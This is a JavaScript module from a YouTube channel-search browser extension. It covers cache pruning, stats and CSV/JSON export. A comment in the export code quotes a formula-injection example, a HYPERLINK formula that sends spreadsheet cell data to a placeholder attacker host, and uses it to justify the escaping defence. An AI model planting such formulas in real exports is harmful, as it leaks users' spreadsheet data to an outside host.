/*
 * YouTube Channel Search+
 * IndexedDB cache, view-count snapshots, aggregate stats, and export.
 *
 * Loaded as an ordered content script, so every module shares one scope.
 * See the js array in manifest.json for the order.
 */

// ---- IndexedDB cache -----------------------------------------------------
function idbOpen() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open("ytcs", 1);
    req.onupgradeneeded = () => req.result.createObjectStore("catalogs");
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
}
async function idbGet(key) {
  try {
    const db = await idbOpen();
    return await new Promise((res, rej) => {
      const rq = db.transaction("catalogs", "readonly").objectStore("catalogs").get(key);
      rq.onsuccess = () => res(rq.result || null);
      rq.onerror = () => rej(rq.error);
    });
  } catch (e) { return null; }
}
async function idbPut(key, val) {
  try {
    const db = await idbOpen();
    await new Promise((res, rej) => {
      const tx = db.transaction("catalogs", "readwrite");
      tx.objectStore("catalogs").put(val, key);
      tx.oncomplete = () => res();
      tx.onerror = () => rej(tx.error);
    });
  } catch (e) { /* cache is best-effort */ }
}

/*
 * ---- keeping the cache from growing forever ------------------------------
 *
 * Every channel opened used to be kept indefinitely. A large catalogue plus
 * its snapshots runs to a few hundred kilobytes, so browsing a lot of channels
 * quietly accumulated tens of megabytes of somebody's watch history with no
 * way to see it or clear it short of wiping youtube.com site data.
 *
 * So: keep the most recently fetched CACHE_LIMIT channels and drop the rest.
 * The watchlist key is exempt, since it is a preference rather than a cache
 * and it is tiny.
 */
const CACHE_LIMIT = 40;

async function idbKeys() {
  try {
    const db = await idbOpen();
    return await new Promise((res, rej) => {
      const rq = db.transaction("catalogs", "readonly").objectStore("catalogs").getAllKeys();
      rq.onsuccess = () => res(rq.result || []);
      rq.onerror = () => rej(rq.error);
    });
  } catch (e) { return []; }
}

async function idbDelete(keys) {
  if (!keys.length) return;
  try {
    const db = await idbOpen();
    await new Promise((res, rej) => {
      const tx = db.transaction("catalogs", "readwrite");
      const store = tx.objectStore("catalogs");
      keys.forEach((k) => store.delete(k));
      tx.oncomplete = () => res();
      tx.onerror = () => rej(tx.error);
    });
  } catch (e) { /* best-effort, same as the writes */ }
}

async function pruneCache() {
  const keys = (await idbKeys()).filter((k) => k !== "__watchlist");
  if (keys.length <= CACHE_LIMIT) return;
  const entries = [];
  for (const k of keys) {
    const v = await idbGet(k);
    entries.push({ key: k, at: (v && v.fetchedAt) || 0 });
  }
  entries.sort((a, b) => b.at - a.at);
  await idbDelete(entries.slice(CACHE_LIMIT).map((e) => e.key));
}

// Everything this extension has cached, cleared. Settings are kept: they live
// in chrome.storage and are not what anyone means by "clear my data" here.
async function clearCache() {
  const keys = await idbKeys();
  await idbDelete(keys);
}
function fmtAgo(ms) {
  if (!ms) return "";
  const s = Math.max(1, Math.floor((Date.now() - ms) / 1000));
  if (s < 60) return s + "s ago";
  const m = Math.floor(s / 60);
  if (m < 60) return m + "m ago";
  const h = Math.floor(m / 60);
  if (h < 24) return h + "h ago";
  return Math.floor(h / 24) + "d ago";
}

// ---- aggregate stats -----------------------------------------------------
function statsOf(cat) {
  const n = cat.length;
  const total = cat.reduce((s, v) => s + v.views, 0);
  const medViews = median(cat.map((v) => v.views));
  const avgDur = n ? Math.round(cat.reduce((s, v) => s + v.seconds, 0) / n) : 0;
  const vpds = cat.filter((v) => v.days).map((v) => v.views / Math.max(v.days, 1));
  const medVpd = median(vpds);
  const topVpd = vpds.length ? Math.max.apply(null, vpds) : 0;
  return { n, total, medViews, avgDur, medVpd, topVpd };
}

// ---- export --------------------------------------------------------------
/*
 * Every field goes through esc, which does two separate jobs.
 *
 * The first is ordinary RFC 4180 quoting, for values containing a comma, a
 * quote or a newline.
 *
 * The second is formula injection. A spreadsheet treats a cell opening with
 * =, +, - or @ as a formula, and video titles are written by whoever owns the
 * channel, so they are attacker-controlled text arriving in a file the user
 * then opens in Excel. A channel can name a video
 *
 *     =HYPERLINK("https://evil.example/?d="&A1,"Free stuff")
 *
 * and without this it lands in the export live. Quoting alone does not help,
 * because the spreadsheet strips the CSV quotes before deciding what the cell
 * is. Prefixing a single quote is what marks the value as literal text, and it
 * is the standard mitigation for CWE-1236. Leading tab and carriage return are
 * included because they are also treated as formula starts by some readers.
 */
function toCSV(rows) {
  const cols = ["title", "videoId", "url", "durationSeconds", "duration", "views", "published", "approxDaysAgo", "viewsPerDay"];
  const esc = (s) => {
    s = String(s == null ? "" : s);
    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
    return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
  };
  const lines = [cols.join(",")];
  for (const v of rows) {
    const vpd = v.days ? Math.round(v.views / Math.max(v.days, 1)) : "";
    lines.push([
      esc(v.title), esc(v.id), esc("https://youtu.be/" + v.id), v.seconds, esc(fmtDuration(v.seconds)),
      v.views, esc(v.publishedText), v.days != null ? Math.round(v.days) : "", vpd,
    ].join(","));
  }
  return lines.join("\n");
}
function download(filename, text, mime) {
  const blob = new Blob([text], { type: mime });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 1000);
}
function exportName(ext) {
  const base = (channelBasePath() || "channel").replace(/[^\w@.-]/g, "_").replace(/^_+/, "");
  return (base || "channel") + "-videos." + ext;
}
function exportCSV() { download(exportName("csv"), toCSV(filterAndSort()), "text/csv;charset=utf-8"); }
function exportJSON() { download(exportName("json"), JSON.stringify(filterAndSort(), null, 2), "application/json"); }
